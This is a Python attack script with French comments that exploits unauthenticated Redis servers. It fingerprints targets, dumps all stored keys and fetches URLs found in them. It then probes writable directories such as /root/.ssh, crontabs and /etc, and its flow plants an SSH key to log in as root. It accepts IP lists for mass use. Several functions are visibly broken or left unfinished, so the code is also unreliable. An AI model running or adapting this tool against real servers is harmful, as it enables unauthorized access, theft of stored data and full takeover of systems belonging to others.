#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nom du code : Gestionnaire de serveurs Redis non authentifiés
Description : Ce code exploite les serveurs Redis non authentifiés pour la sécurité.
              Il cherche des répertoires vulnérables et exécute des commandes via SSH.
Auteur      : ZarTek-Creole
Date        : 06-12-23
Source      :
        - https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419
        - http://antirez.com/news/96
        - https://rioasmara.com/2023/04/07/redis-rce-post-exploitation/
        - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
"""

import argparse
import base64
import datetime
import logging
import os
import re
import subprocess
import sys
import time
from typing import List, Tuple

import redis
import requests


class RedisConfig:
    CLI_PATHS = ['/usr/bin/redis-cli', '/usr/local/bin/redis-cli']
    DEFAULT_PORT = '6379'
    DEFAULT_USER = 'root'
    DEFAULT_SSH_KEY = 'id_ed25519.pub'
    DEFAULT_TIMEOUT = 5
    VULNERABLE_DIRECTORIES = [
        "/var/www/html", "/home/redis/.ssh", "/var/lib/redis/.ssh",
        "/var/spool/cron/crontabs", "/var/spool/cron", "/etc"
    ]
    REDIS_COMMANDS = [
        'config set dbfilename backup.db',
        'config set dir',
        'config set dbfilename dump.rdb',
        'save'
    ]
    # Modèle d'expression régulière pour vérifier si une URL est présente
    REGEXP_URI = r'''(?xi)
        \b
        (							# Capture 1: entire matched URL
          (?:
            https?:				# URL protocol and colon
            (?:
              /{1,3}						# 1-3 slashes
              |								#   or
              [a-z0-9%]						# Single letter or digit or '%'
              								# (Trying not to match e.g. "URI::Escape")
            )
            |							#   or
            							# looks like domain name followed by a slash:
            [a-z0-9.\-]+[.]
            (?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj| Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)
            /
          )
          (?:							# One or more:
            [^\s()<>{}\[\]]+						# Run of non-space, non-()<>{}[]
            |								#   or
            \([^\s()]*?\([^\s()]+\)[^\s()]*?\)  # balanced parens, one level deep: (…(…)…)
            |
            \([^\s]+?\)							# balanced parens, non-recursive: (…)
          )+
          (?:							# End with:
            \([^\s()]*?\([^\s()]+\)[^\s()]*?\)  # balanced parens, one level deep: (…(…)…)
            |
            \([^\s]+?\)							# balanced parens, non-recursive: (…)
            |									#   or
            [^\s`!()\[\]{};:'".,<>?«»“”‘’]		# not a space or one of these punct chars
          )
          |					# OR, the following to match naked domains:
          (?:
            (?<!@)			# not preceded by a @, avoid matching foo@_gmail.com_
            [a-z0-9]+
            (?:[.\-][a-z0-9]+)*
            [.]
            (?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj| Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)
            \b
            /?
            (?!@)			# not succeeded by a @, avoid matching "foo.na" in "foo.na@example.com"
          )
        )'''
    # Modèle d'expression régulière pour rechercher la commande base64
    REGEXP_BASE64 = r'echo\s(.*?)\|base64\s-d'


class ExitOnErrorHandler(logging.StreamHandler):
    def emit(self, record: logging.LogRecord):
        super().emit(record)  # Permet l'affichage normal du log
        if record.levelno >= logging.ERROR:
            sys.exit(1)


def configure_logging(is_verbose: bool):
    logging.basicConfig(
        format="[%(levelname)s] %(message)s",
        level=logging.DEBUG if is_verbose else logging.INFO,
        handlers=[ExitOnErrorHandler()]
    )


class RedisServerManager:
    def __init__(
        self,
        ip_address: str,
        port: str = RedisConfig.DEFAULT_PORT,
        user: str = RedisConfig.DEFAULT_USER,
        ssh_key: str = RedisConfig.DEFAULT_SSH_KEY,
        timeout: int = RedisConfig.DEFAULT_TIMEOUT
    ):
        self.ip_address = ip_address
        self.port = port
        self.user = user
        self.ssh_key = ssh_key
        self.ssh_key_private = self._derive_ssh_key_private(ssh_key)
        self.timeout = timeout
        self.directory_path = self._determine_directory_path(user)
        self.binary_redis = self._check_binary()

    @staticmethod
    def _derive_ssh_key_private(ssh_key: str) -> str:
        return ssh_key.rstrip('.pub')

    @staticmethod
    def _determine_directory_path(user: str) -> str:
        return '/root/.ssh/' if user == "root" else f'/home/{user}/.ssh/'

    def _check_binary(self) -> str:
        self._validate_ssh_keys()
        self._validate_ssh_client()
        return self._find_redis_cli()

    def _validate_ssh_keys(self):
        if not os.path.isfile(self.ssh_key) or not os.path.isfile(self.ssh_key_private):
            error_message = "Les clés SSH spécifiées n'existent pas. Assurez-vous d'avoir fourni le bon chemin.\n"
            error_message += "Pour générer une clé SSH : ssh-keygen -t ed25519 -f ./id_ed25519 -N ''"
            logging.error(error_message)
            raise FileNotFoundError(f"Les clés SSH '{self.ssh_key}' et '{self.ssh_key_private}' n'existent pas.")

    @staticmethod
    def _validate_ssh_client():
        """
        Vérifie si le client SSH est installé.
        Raises:
            EnvironmentError: Si le client SSH n'est pas installé.
        """
        try:
            subprocess.run(["ssh", "-V"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError as exc:
            logging.error("Le client SSH n'est pas installé.")
            raise EnvironmentError("Le client SSH n'est pas installé. Veuillez installer un client SSH (ex. : 'apt install openssh-client').") from exc

    def _find_redis_cli(self) -> str:
        for path in RedisConfig.CLI_PATHS:
            if os.path.isfile(path):
                return path
        logging.error("Le client Redis n'est pas installé.")
        raise EnvironmentError("Le client Redis n'est pas installé. Veuillez installer un client Redis (ex. : 'apt install redis-tools').")

    def process_server(self) -> Tuple[bool, str]:
        logging.info(
            "Tentative de connexion à %s:%s avec l'utilisateur %s et la clé SSH '%s' "
            "(timeout %s sec) écriture dans %s",
            self.ip_address,
            self.port,
            self.user,
            self.ssh_key,
            self.timeout,
            self.directory_path,
        )
        success, msg = self.redis_get_banner()
        if not success:
            return False, msg
        success, msg = self.redis_get_dump()
        if not success:
            return False, msg

        success, msg = self.find_vulnerable_directory()
        if not success:
            return False, "Aucun répertoire vulnérable trouvé."
        # logging.debug(
        #     "Répertoire vulnérable trouvé : %s" if success else msg, self.directory_path
        # )
        # if not success:
        #     return False, msg
        # return self.execute_redis_commands()

    def redis_get_banner(self) -> Tuple[bool, str]:
        success, data = self.execute_command_redis(["INFO"])
        if not success:
            return False, data
        redis_version = re.search(r"redis_version:(.*?)\n", data).group(1)
        redis_os = re.search(r"os:(.*?)\n", data).group(1)

        uptime_in_seconds = int(re.search(r"uptime_in_seconds:(\d+)\n", data).group(1))
        # Créez un objet timedelta à partir du nombre d'uptime en secondes
        uptime_timedelta = datetime.timedelta(seconds=uptime_in_seconds)

        # Convertissez la durée en une chaîne lisible
        uptime_str = str(uptime_timedelta)

        used_memory = int(re.search(r"used_memory:(\d+)\n", data).group(1))
        total_connections_received = int(
            re.search(r"total_connections_received:(\d+)\n", data).group(1)
        )
        total_commands_processed = int(
            re.search(r"total_commands_processed:(\d+)\n", data).group(1)
        )

        # Afficher les valeurs extraites
        logging.info(f"Redis Version: {redis_version}")
        logging.info(f"Redis Operating System: {redis_os}")

        # Affichez la durée
        logging.info(f"Uptime in Seconds: {uptime_in_seconds} ({uptime_str})")
        logging.info(f"Used Memory: {used_memory} bytes")
        logging.info(f"Total Connections Received: {total_connections_received}")
        logging.info(f"Total Commands Processed: {total_commands_processed}")
        return True, "OK"

    def redis_get_dump_parser(self, key_value):
        if "base64 -d" in key_value:
            key_value = self.decode_and_replace_base64(key_value)
        return key_value

    def replace_variables_with_values(self, file_path):
        # Étape 1: Lecture du fichier et stockage des variables
        variables = {}
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()

        # Identifier et stocker les déclarations de variables
        for line in lines:
            if '=' in line and '$(' in line and ')' in line:
                var_name, var_value = line.split('=', 1)
                var_value = var_value.strip()
                if var_value.startswith('$(') and var_value.endswith(')'):
                    var_value = var_value[2:-1]  # Enlever les symboles $() pour garder la valeur
                variables[var_name.strip()] = var_value

        # Étape 2: Remplacer les occurrences des variables par leurs valeurs
        with open(file_path, 'w', encoding='utf-8') as file:
            for line in lines:
                for var_name, var_value in variables.items():
                    if f"${{{var_name}}}" in line or f"${var_name}" in line:
                        # Ajouter $(...) autour de la valeur de la variable
                        line = line.replace(f"${{{var_name}}}", f"$({var_value})").replace(f"${var_name}", f"$({var_value})")
                file.write(line)

    def download_and_replace_lines(self, url, original_file_path, modified_file_path):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                # Téléchargez le contenu du fichier
                file_content = response.text

                # Copiez le contenu dans un fichier temporaire
                with open(modified_file_path, 'w', encoding='utf-8') as modified_file:
                    # Parcourez les lignes du fichier d'origine
                    for line in file_content.split('\n'):
                        # Vérifiez si la ligne doit être remplacée
                        if "|base64 -d" in line:
                            # Extraire la commande base64
                            base64_command_match = re.search(r'echo\s(.*?)\|base64 -d', line)
                            if base64_command_match:
                                base64_command = base64_command_match.group(1)
                                decoded_data = base64.b64decode(base64_command.encode('utf-8')).decode('utf-8').strip()
                                # Remplacez la ligne par la version décodée
                                line = re.sub(r'echo\s.*?\|base64 -d', f'echo {decoded_data}', line)

                        # Écrivez la ligne dans le fichier modifié
                        modified_file.write(line + '\n')

                logging.info(f"Fichier téléchargé depuis {url} et lignes modifiées enregistrées sous {modified_file_path}")
            else:
                logging.info(f"Échec du téléchargement depuis {url}, statut HTTP {response.status_code}")
        except Exception as e:
            logging.info(f"Erreur lors du téléchargement depuis {url}: {str(e)}")

    def redis_get_dump_parser_url(self, key_value, path):

        # Recherchez toutes les correspondances dans le texte
        urls = re.findall(RedisConfig.REGEXP_URI, key_value)
        for url in urls:
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    # Construisez le chemin complet du fichier à enregistrer
                    file_name = os.path.basename(url)
                    file_path_original = os.path.join(path, file_name)
                    file_path_modified = os.path.join(path, f"modified_{file_name}")

                    # Enregistrez le contenu téléchargé dans le fichier original
                    with open(file_path_original, 'wb') as file:
                        file.write(response.content)

                    logging.info(f"Fichier téléchargé depuis {url} et enregistré sous {file_path_original}")

                    # Utilisez la fonction pour télécharger et remplacer les lignes
                    self.download_and_replace_lines(url, file_path_original, file_path_modified)
                    self.replace_variables_with_values(file_path_modified)
                    self.replace_variables_and_urls(file_path_modified)

                else:
                    logging.info(f"Échec du téléchargement depuis {url}, statut HTTP {response.status_code}")
            except Exception as e:
                logging.info(f"Erreur lors du téléchargement depuis {url}: {str(e)}")

    def replace_variables_and_urls(self, file_path):
        # Étape 1: Lecture du fichier et stockage des variables
        variables = {}
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()

        # Identifier et stocker les déclarations de variables
        for line in lines:
            if '=' in line and '$(' in line and ')' in line:
                var_name, var_value = line.split('=', 1)
                var_value = var_value.strip()
                if var_value.startswith('$(') and var_value.endswith(')'):
                    var_value = var_value[2:-1]  # Enlever les symboles $() pour garder la valeur
                variables[var_name.strip()] = var_value

        # Étape 2: Remplacer les occurrences des variables et les URLs
        with open(file_path, 'w', encoding='utf-8') as file:
            for line in lines:
                for var_name, var_value in variables.items():
                    if f"${{{var_name}}}" in line or f"${var_name}" in line:
                        line = line.replace(f"${{{var_name}}}", f"$({var_value})").replace(f"${var_name}", f"$({var_value})")

                # Vérifier et remplacer les URLs dans les commandes echo
                if 'echo ' in line and '|base64 -d' not in line:
                    potential_urls = re.findall(RedisConfig.REGEXP_URI, line)
                    for url in potential_urls:
                        line = line.replace(f'echo {url}', url)

                file.write(line)

    def decode_and_replace_base64(self, text):

        def replace(match):
            base64_command = match.group(1)
            try:
                # Décodez la commande base64
                decoded_command = base64.b64decode(base64_command.encode('utf-8')).decode('utf-8')
                # Supprimez les retours à la ligne indésirables
                decoded_command = decoded_command.replace('\n', ' ')
                return f'echo {decoded_command}'
            except Exception:
                # En cas d'erreur lors du décodage, retournez la ligne originale
                return match.group(0)

        # Recherchez et remplacez la commande base64 dans le texte
        modified_text = re.sub(RedisConfig.REGEXP_BASE64, replace, text)

        return modified_text

    def redis_get_dump(self) -> Tuple[bool, str]:
        if not os.path.isdir("dumps"):
            os.mkdir("dumps")
            logging.info("Création du répertoire 'dumps' dans le répertoire courant.")
        redis_conn = redis.StrictRedis(self.ip_address, self.port, db=0)
        dbs = redis_conn.info('keyspace').keys()
        for db in dbs:
            db_number = int(db[2:])
            rdb_filename = f'db_{self.ip_address}_{db_number}.rdb'
            redis_conn.select(db_number)
            redis_conn.bgsave()
            while True:
                info = redis_conn.info("persistence")
                if info["rdb_bgsave_in_progress"] == 0:
                    break
                time.sleep(1)
            logging.info(f"Base de données {db_number} exportée vers {rdb_filename}")

            # Liste des clés
            keys = redis_conn.keys("*")
            dumpPath = os.path.join("dumps", f"{self.ip_address}")
            if not os.path.isdir(dumpPath):
                os.mkdir(dumpPath)
            # Parcourir chaque clé et les sauvegarder dans des fichiers individuels
            for key in keys:
                key_bytes = redis_conn.get(key)
                key_value = key_bytes.decode("utf-8")
                key_data = self.redis_get_dump_parser(key_value)
                self.redis_get_dump_parser_url(key_data, dumpPath)
                with open(os.path.join(dumpPath, f"{key}.dump"), 'w', encoding='utf-8') as key_file:
                    key_file.write(key_data)  # Écrire la chaîne en UTF-8

                logging.info(f"Clé {key} exportée")

        redis_conn.close()
        return True, "OK"

    def execute_command_redis(self, redis_command: List[str]):
        logging.debug("Commande Redis execute_command : %s", redis_command)
        command = [
            self.binary_redis,
            "-h",
            self.ip_address,
            "-p",
            str(self.port),
        ] + redis_command
        success, stdout_output, stderr_output = self.execute_command(command)
        if success:
            return True, stdout_output
        else:
            return False, stderr_output

    def find_vulnerable_directory(self) -> Tuple[bool, str]:
        for directory in RedisConfig.VULNERABLE_DIRECTORIES:
            if self.test_directory(directory):
                self.directory_path = directory
                return True, f"Répertoire vulnérable trouvé : {directory}"
        return False, "Aucun répertoire vulnérable trouvé."

    def test_directory(self, directory: str) -> bool:
        logging.debug("Test directory : %s", directory)
        command = [
            "config",
            "set",
            "dir",
            directory
        ]
        success, server_message = self.execute_command_redis(command)
        if server_message.startswith("ERR "):
            return False
        logging.info("--------------------- %s-------------------- %s", server_message, command)
        return success

    def execute_redis_commands(self) -> Tuple[bool, str]:
        for cmd in RedisConfig.REDIS_COMMANDS:
            command = [
                self.binary_redis,
                "-h",
                self.ip_address,
                "-p",
                str(self.port),
            ] + cmd.split()
            logging.debug("Commande Redis execute_redis_commands : %s", command)
            success, stdout_output, stderr_output = self.execute_command(command)
            if not success:
                return False, stderr_output
            return self.execute_ssh_command()

    def execute_command(self, command: List[str]) -> Tuple[bool, str, str]:
        logging.debug("Commande execute_command: %s", command)
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
            )
            stdout, stderr = process.communicate(timeout=float(self.timeout))
            if process.returncode == 0:
                return True, stdout.strip(), stderr.strip()
            else:
                return False, "Erreur : %s" % stderr.strip(), stdout.strip()
        except subprocess.TimeoutExpired as timeout_error:
            return (
                False,
                "Le délai de la commande a expiré après %s secondes." % self.timeout,
                str(timeout_error),
            )
        except OSError as os_error:
            return False, "Erreur : %s" % str(os_error), str(os_error)

    def _check_redis_result(
        self, result: subprocess.CompletedProcess
    ) -> Tuple[bool, str]:
        if result.returncode != 0:
            return False, result.stderr.strip()
        return True, "Commande exécutée avec succès."

    def execute_ssh_command(self) -> Tuple[bool, str]:
        ssh_command = self.build_ssh_command()
        logging.debug("Commande SSH : %s", ssh_command)
        success, stdout_output, stderr_output = self.execute_command(ssh_command)
        if success:
            logging.info("Commande réussie. Sortie standard : %s" % stdout_output)
            return True, "Commande exécutée avec succès."
        else:
            logging.info("Erreur : %s" % stderr_output)
            return False, stderr_output

    def build_ssh_command(self) -> List[str]:
        return [
            "ssh",
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "ConnectTimeout=%s" % self.timeout,
            "-o",
            "PasswordAuthentication=no",
            "-i",
            self.ssh_key,
            "%s@%s" % (self.user, self.ip_address),
        ]


def process_file(file_path: str, port: str, user: str, ssh_key: str, timeout: int):
    with open(file_path, "r", encoding="utf-8") as file:
        for ip_address in file:
            ip_address = ip_address.strip()
            if ip_address:
                manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
                success, message = manager.process_server()
                logging.info(
                    "IP %s - Résultat : %s, Message : %s", ip_address, success, message
                )


def process_scan(scan: str, port: str, user: str, ssh_key: str, timeout: int):
    # scan par zgrab2

    # on verifie la presence de golang
    try:
        subprocess.run(["masscan", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
    except subprocess.CalledProcessError:
        logging.error("Le client masscan n'est pas installé. Veuillez installer un client masscan (ex. : 'apt install masscan').")

        manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
        success, message = manager.process_server()
        logging.info(f"IP {ip_address} - Résultat : {success}, Message : {message}")


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Gestionnaire de serveurs Redis non authentifiés", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-i', '--ip', help="Adresse IP du serveur Redis")
    parser.add_argument('-f', '--file', help="Chemin du fichier contenant les adresses IP")
    parser.add_argument('-sc', '--scan', help="Scan des adresses IP")
    parser.add_argument('-b', '--banner', action='store_true', help="Afficher la bannière")
    parser.add_argument('-p', '--port', type=int, default=RedisConfig.DEFAULT_PORT, help="Port du serveur Redis")
    parser.add_argument('-u', '--user', default=RedisConfig.DEFAULT_USER, help="Utilisateur SSH pour la connexion")
    parser.add_argument('-s', '--sshKey', default=RedisConfig.DEFAULT_SSH_KEY, help="Chemin du fichier de clé SSH")
    parser.add_argument('-t', '--timeout', type=int, default=RedisConfig.DEFAULT_TIMEOUT, help="Délai de connexion")
    parser.add_argument('-v', '--verbose', action='store_true', help="Augmenter la verbosité des logs")
    args = parser.parse_args()

    if not (args.ip or args.file):
        parser.print_help()
        sys.exit(1)

    return args


def main():
    args = parse_arguments()
    configure_logging(args.verbose)

    if not (args.ip or args.file or args.scan):
        logging.warning(
            "Aucune adresse IP ou chemin de fichier spécifié. "
            "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
            "'-f' pour spécifier un fichier contenant des adresses IP. "
            "'-sc' pour scanner les adresses IP. "
            "Utilisez '--help' pour plus d'informations."
        )
    elif args.ip:
        manager = RedisServerManager(
            args.ip, args.port, args.user, args.sshKey, args.timeout
        )
        success, message = manager.process_server()
        logging.info("IP %s - Résultat : %s, Message : %s", args.ip, success, message)
    elif args.scan:
        process_scan(args.scan, args.port, args.user, args.sshKey, args.timeout)
    else:
        process_file(args.file, args.port, args.user, args.sshKey, args.timeout)


if __name__ == "__main__":
    main()
